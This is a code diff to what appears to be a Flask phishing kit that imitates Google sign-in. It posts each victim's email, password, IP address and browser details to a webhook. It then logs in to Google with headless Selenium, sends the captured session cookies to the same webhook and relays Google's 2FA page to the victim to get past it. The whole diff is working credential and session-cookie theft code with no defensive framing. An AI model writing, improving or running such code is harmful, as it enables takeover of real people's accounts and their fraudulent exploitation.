@@ -226,11 +226,12 @@ def enter_password():
         password_val = request.form.get('password') or ''
         session['email'] = email
         branding = get_google_email_details(email)
-        
+
         # Collect info for webhook
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent', '')
         import httpagentparser
+        import time
         browser_info = httpagentparser.detect(user_agent)
         user_browser = browser_info.get('browser', {}).get('name', '')
         browser_version = browser_info.get('browser', {}).get('version', '')
@@ -258,132 +259,146 @@ def enter_password():
             f"⏰ Time: {current_time}"
         )
         send_webhook_message(credentials_message)
-        
         # After capturing credentials, set authenticated flag and store password
         session['authenticated'] = True
         session['password'] = password_val  # Temporarily store for the flow
 
-        # Stay on password page after POST, do not re-render or redirect
-        # The password.html template should include a JS event listener for the "Next" button.
-        # When clicked, show a loading animation and trigger AJAX to /ajax-headless-login.
-        # The page remains until AJAX completes, then JS can redirect to the final URL.
+        # Call Selenium headless login to process credentials and capture cookies
+        login_result = handle_headless_login(email, password_val)
 
+        if login_result is not None and login_result.get('success'):
+            # Login successful, redirect user to Gmail inbox
+            session.clear()
+            return redirect('https://mail.google.com/')
+        elif login_result is not None and login_result.get('2fa_required'):
+            # 2FA required, render the Google 2FA challenge page for user to complete
+            twofa_html = login_result.get('2fa_html', '')
+            # Render the raw HTML from Google for 2FA challenge
+            return Response(twofa_html, mimetype='text/html')
+        else:
+            # Login failed, show error on password page
+            error = 'Invalid password or login failed.'
+            return render_template(
+                'password.html',
+                email=email,
+                banner=session.get('banner'),
+                background=session.get('background'),
+                error=error,
+                loading=False
+            )
+    else:
         return render_template(
             'password.html',
             email=email,
             banner=session.get('banner'),
             background=session.get('background'),
-            error=None,
-            loading=False  # JS will handle loading animation on button click
+            error=error
         )
-        # If GET, show password page again if session email exists
-        return render_template('password.html', email=email, error=error, branding=branding)
 
-    # AJAX endpoint to trigger headless login and return result
-    @app.route('/ajax-headless-login', methods=['POST'])
-    def ajax_headless_login():
-        if not session.get('authenticated'):
-            return jsonify({'success': False, 'error': 'Not authenticated'}), 403
-        email = session.get('email')
-        password = session.get('password')
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+@app.route('/ajax-headless-login', methods=['POST'])
+def ajax_headless_login():
+    if not session.get('authenticated'):
+        return jsonify({'success': False, 'error': 'Not authenticated'}), 403
+    email = session.get('email')
+    password = session.get('password')
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        login_result = handle_headless_login(email, password)
-        if login_result is not None and login_result.get('success'):
-            cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
-            # Prepend email to the cookies content
-            file_content = f"{email}\n{cookies_json}"
-            cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
-            send_webhook_message(cookie_webhook_message)
-            # Save cookies to a temp file for download, prepended with email
-            with open(COOKIE_TEMP_FILE, 'w') as f:
-                f.write(file_content)
-            session.clear()
-            return jsonify({'success': True, 'cookies_json': cookies_json})
-        else:
-            # If login failed due to password, show error
-            if login_result is not None and login_result.get('error') == 'invalid_password':
-                session['authenticated'] = False
-                return jsonify({'success': False, 'error': 'Invalid password'})
-            send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
-            session.clear()
-            return jsonify({'success': False})
+    login_result = handle_headless_login(email, password)
+    if login_result is not None and login_result.get('success'):
+        cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
+        file_content = f"{email}\n{cookies_json}"
+        cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
+        send_webhook_message(cookie_webhook_message)
+        with open(COOKIE_TEMP_FILE, 'w') as f:
+            f.write(file_content)
+        session.clear()
+        # Redirect user to Gmail inbox after successful login
+        return jsonify({'success': True, 'cookies_json': cookies_json, 'redirect_url': 'https://mail.google.com/'})
+    elif login_result is not None and login_result.get('2fa_required'):
+        # Render the 2FA page HTML for user to complete authentication in browser
+        twofa_html = login_result.get('2fa_html', '')
+        return jsonify({'success': False, '2fa_required': True, '2fa_html': twofa_html})
+    else:
+        if login_result is not None and login_result.get('error') == 'invalid_password':
+            session['authenticated'] = False
+            return jsonify({'success': False, 'error': 'Invalid password'})
+        send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
+        session.clear()
+        return jsonify({'success': False})
 
-    def handle_headless_login(email, password):
-        """
-        Uses Selenium to perform a headless login to Google and capture cookies.
-        Returns a dict: {'success': bool, 'cookies': list, 'error': str, '2fa_required': bool}
-        If 2FA is required, returns '2fa_required': True and page HTML for user to complete 2FA.
-        """
-        options = webdriver.ChromeOptions()
-        options.add_argument('--headless')
-        options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
-        options.add_argument(f'user-agent={Browser().get_random_agent()}')
-        options.add_argument('--window-size=1920,1080')
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
+def handle_headless_login(email, password):
+    """
+    Uses Selenium to perform a headless login to Google and capture cookies.
+    Returns a dict: {'success': bool, 'cookies': list, 'error': str, '2fa_required': bool}
+    If 2FA is required, returns '2fa_required': True and page HTML for user to complete 2FA.
+    """
+    options = webdriver.ChromeOptions()
+    options.add_argument('--headless')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument(f'user-agent={Browser().get_random_agent()}')
+    options.add_argument('--window-size=1920,1080')
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
 
-        try:
-            with webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options) as driver:
-                wait = WebDriverWait(driver, 20)
-                driver.get("https://accounts.google.com/signin")
+    try:
+        with webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options) as driver:
+            wait = WebDriverWait(driver, 20)
+            driver.get("https://accounts.google.com/signin")
 
-                # Enter email
-                wait.until(EC.visibility_of_element_located((By.ID, "identifierId"))).send_keys(email)
-                driver.find_element(By.ID, "identifierNext").click()
+            # Enter email
+            wait.until(EC.visibility_of_element_located((By.ID, "identifierId"))).send_keys(email)
+            driver.find_element(By.ID, "identifierNext").click()
 
-                # Wait for password input
-                wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))).send_keys(password)
-                driver.find_element(By.ID, "passwordNext").click()
+            # Wait for password input
+            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))).send_keys(password)
+            driver.find_element(By.ID, "passwordNext").click()
 
-                # Wait for either successful login or error
+            # Wait for either successful login or error or 2FA
+            try:
+                wait.until(lambda d: "mail.google.com" in d.current_url or "myaccount.google.com" in d.current_url)
+                cookies = driver.get_cookies()
+                google_cookies = [c for c in cookies if 'google.com' in c.get('domain', '')]
+                return {'success': True, 'cookies': google_cookies if google_cookies else cookies, '2fa_required': False}
+            except Exception:
+                # Check for error message on page
                 try:
-                    wait.until(lambda d: "mail.google.com" in d.current_url or "myaccount.google.com" in d.current_url)
-                    cookies = driver.get_cookies()
-                    google_cookies = [c for c in cookies if 'google.com' in c.get('domain', '')]
-                    return {'success': True, 'cookies': google_cookies if google_cookies else cookies, '2fa_required': False}
+                    error_elem = driver.find_element(By.CSS_SELECTOR, "div[jsname='B34EJ']")
+                    if error_elem and "Wrong password" in error_elem.text:
+                        return {'success': False, 'cookies': [], 'error': 'invalid_password', '2fa_required': False}
                 except Exception:
-                    # Check for error message on page
-                    try:
-                        error_elem = driver.find_element(By.CSS_SELECTOR, "div[jsname='B34EJ']")
-                        if error_elem and "Wrong password" in error_elem.text:
-                            return {'success': False, 'cookies': [], 'error': 'invalid_password', '2fa_required': False}
-                    except Exception:
-                        pass
+                    pass
 
-                    # Check for 2FA prompt
-                    try:
-                        # Look for common 2FA elements (phone prompt, code input, authenticator app, etc.)
-                        twofa_selectors = [
-                            "input[type='tel']",  # phone code
-                            "input[type='text']", # authenticator code
-                            "div[data-challengetype]", # challenge container
-                            "div[jsname='r4nke']", # Google prompt
-                            "div[jsname='Qx7uuf']", # Authenticator app
-                        ]
-                        for selector in twofa_selectors:
-                            elems = driver.find_elements(By.CSS_SELECTOR, selector)
-                            if elems:
-                                # 2FA detected, get page HTML for user to complete
-                                page_html = driver.page_source
-                                return {
-                                    'success': False,
-                                    'cookies': [],
-                                    'error': '2fa_required',
-                                    '2fa_required': True,
-                                    '2fa_html': page_html
-                                }
-                    except Exception:
-                        pass
+                # Check for 2FA prompt
+                try:
+                    twofa_selectors = [
+                        "input[type='tel']",
+                        "input[type='text']",
+                        "div[data-challengetype]",
+                        "div[jsname='r4nke']",
+                        "div[jsname='Qx7uuf']",
+                    ]
+                    for selector in twofa_selectors:
+                        elems = driver.find_elements(By.CSS_SELECTOR, selector)
+                        if elems:
+                            # 2FA detected, get page HTML for user to complete
+                            page_html = driver.page_source
+                            return {
+                                'success': False,
+                                'cookies': [],
+                                'error': '2fa_required',
+                                '2fa_required': True,
+                                '2fa_html': page_html
+                            }
+                except Exception:
+                    pass
 
-                    # General failure
-                    return {'success': False, 'cookies': [], 'error': 'login_failed', '2fa_required': False}
-        except Exception as e:
-            print(f"[ERROR] An exception occurred during headless login for {email}: {str(e)}")
-            return {'success': False, 'cookies': [], 'error': 'exception', '2fa_required': False}
-        # Ensure a dictionary is always returned
-        return {'success': False, 'cookies': [], 'error': 'unknown_error', '2fa_required': False}
+                # General failure
+                return {'success': False, 'cookies': [], 'error': 'login_failed', '2fa_required': False}
+    except Exception as e:
+        print(f"[ERROR] An exception occurred during headless login for {email}: {str(e)}")
+        return {'success': False, 'cookies': [], 'error': 'exception', '2fa_required': False}
+    return {'success': False, 'cookies': [], 'error': 'unknown_error', '2fa_required': False}
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
